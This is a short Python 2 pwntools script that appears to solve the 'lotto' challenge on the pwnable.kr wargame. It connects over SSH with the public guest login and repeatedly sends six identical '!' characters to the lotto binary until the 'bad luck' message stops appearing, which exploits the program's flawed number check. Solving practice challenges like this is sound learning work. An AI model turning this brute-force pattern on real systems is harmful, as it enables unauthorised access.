#!/usr/bin/python2
from pwn import *

s = ssh('lotto', 'pwnable.kr', 2222, 'guest')
p = s.process('./lotto')

def Sendline(s):
    p.sendline(s)
    print(s)
    sleep(0.5)

while True:
    Sendline('1')
    print p.read(),
    
    Sendline('!!!!!!')
    rec = p.read()
    print rec,

    if rec.find('bad luck') == -1:
        break
